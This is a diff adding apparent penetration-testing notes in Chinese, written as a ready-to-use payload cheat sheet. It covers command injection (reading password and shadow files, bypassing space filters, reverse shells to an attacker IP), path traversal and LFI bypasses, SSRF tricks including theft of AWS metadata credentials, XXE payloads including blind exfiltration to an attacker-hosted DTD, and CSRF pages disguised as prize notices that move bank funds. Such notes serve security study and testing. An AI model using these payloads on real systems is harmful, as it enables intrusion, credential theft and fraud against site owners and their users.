@@ -113,6 +113,97 @@ https://ithelp.ithome.com.tw/m/articles/10328790
 - LinEnum -> https://github.com/rebootuser/LinEnum
 - Linux Exploit Suggester -> https://github.com/mzet-/linux-exploit-suggester
 
+5. OS Command Injection (作業系統指令注入) -> 攻擊者通常會利用指令分隔符來串接惡意指令。假設原本的輸入框是讓使用者輸入 IP（如 127.0.0.1）。
+(1) 基本探測與讀取敏感檔 (Linux)
+- ; cat /etc/passwd (分號：執行完前面，繼續執行後面)
+- && cat /etc/shadow (AND：前面成功才執行後面)
+- | whoami (Pipe：把前面的輸出當作後面的輸入，通常會直接印出後面指令的結果)
+- `whoami` 或 $(whoami) (內嵌指令：優先執行括號內的指令)
+(2) 基本探測與讀取敏感檔 (Windows)
+- & type C:\Windows\win.ini
+- | whoami /priv
+(3) 繞過空格過濾 (Linux 常見技巧)
+- ;cat</etc/passwd(利用<` 符號代替空格)
+- ;cat$IFS/etc/passwd (利用 Linux 內建的 $IFS 環境變數代替空格)
+(4) 建立反向連線 (Reverse Shell，直接控制主機)
+- ; bash -i >& /dev/tcp/攻擊者IP/4444 0>&1
+- ; nc -e /bin/sh 攻擊者IP 4444
+
+6. Path Traversal / LFI (路徑穿越 / 本地檔案包含) -> 假設目標網址是 ?file=report.pdf，攻擊者會替換掉 report.pdf。
+(1) 基礎跳脫 (Linux & Windows)
+- ../../../etc/passwd (Linux 密碼檔)
+- ..\..\..\windows\win.ini (Windows 設定檔)
+(2) 繞過基礎過濾 (WAF 或簡單的字串替換)
+- ....//....//....//etc/passwd (如果後端只把 ../ 替換成空字串，替換後剛好又變成 ../)
+- %2e%2e%2f%2e%2e%2fetc/passwd (URL 編碼，%2e 是點，%2f 是斜線)
+- %252e%252e%252fetc/passwd (雙重 URL 編碼，用來繞過某些解碼不完全的防火牆)
+(3) 空字節截斷 (針對 PHP 5.3 以下舊版本)
+- ../../../etc/passwd%00.jpg (騙過後端副檔名檢查，但讀取時遇到 %00 就會停止讀取後面的 .jpg)
+(4) PHP 封裝協議 (PHP Wrappers，LFI 必考題)
+- php://filter/read=convert.base64-encode/resource=index.php (把網頁的原始碼變成 Base64 印出來，防止 PHP 被直接執行，藉此偷看後端 Source Code)
+
+7. SSRF (伺服器端請求偽造) -> 假設目標網址有抓取圖片功能：?url=http://example.com/image.jpg。
+(1) 探測本地端服務 (Localhost)
+- http://127.0.0.1:80 或 http://localhost:22
+(2) 繞過 IP 限制 (如果 WAF 阻擋了 "127.0.0.1")
+- http://0177.0.0.1/ (八進位表示法)
+- http://0x7f000001/ (十六進位表示法)
+- http://2130706433/ (十進位整數表示法)
+- http://localtest.me (這是一個真實存在的網域，但它的 A 紀錄永遠指向 127.0.0.1)
+(3) 讀取本地檔案 (利用 File 協議)
+- file:///etc/passwd
+- file:///C:/Windows/win.ini
+(4) 攻擊雲端 Metadata (AWS / GCP / Azure)
+- http://169.254.169.254/latest/meta-data/iam/security-credentials/ (直接偷取 AWS 雲端權限 Token)
+
+8. XXE (XML 外部實體注入) -> 攻擊者在上傳 XML 檔案，或是 API 接收 XML 格式時，塞入惡意的 <!DOCTYPE>。
+- 經典：讀取本地檔案 -> (將 <name> 的內容替換為密碼檔，並期望前端會把 <name> 的內容印出來)
+```
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <name>&xxe;</name>
+</root>
+```
+- 結合 SSRF (利用 XXE 去打內網)
+```
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<root>
+    <name>&xxe;</name>
+</root>
+```
+- Blind XXE (盲註：如果網頁不會印出 XML 解析結果) -> 攻擊者會利用外部 DTD，讓伺服器把讀取到的檔案內容，當作 URL 參數發送到攻擊者的伺服器。
+```
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+    <!ENTITY % ext SYSTEM "http://攻擊者IP/evil.dtd">
+    %ext;
+]>
+<root></root>
+```
+
+9. CSRF (跨站請求偽造) -> CSRF 不是在目標網站的輸入框打字，而是攻擊者自己寫一個 HTML 網頁，騙受害者點開。
+- 針對 GET 請求 (最簡單) -> 駭客在論壇發一篇文章，裡面藏一張 0x0 像素的隱藏圖片
+```
+<img src="http://bank.com/transfer?to=hacker&amount=10000" width="0" height="0" border="0">
+```
+- 針對 POST 請求 (利用隱藏表單 + 自動提交) -> 駭客寫一個釣魚網頁（如：中獎通知），受害者一點開，裡面的 JavaScript 就會瞬間幫受害者送出表單
+```
+<html>
+  <body onload="document.getElementById('csrf-form').submit()">
+    <h1>恭喜你中獎了！正在載入獎品...</h1>
+    <form id="csrf-form" action="http://bank.com/transfer" method="POST" style="display:none;">
+      <input type="hidden" name="to" value="hacker" />
+      <input type="hidden" name="amount" value="10000" />
+    </form>
+  </body>
+</html>
+```
 
 ## 清除紀錄
 
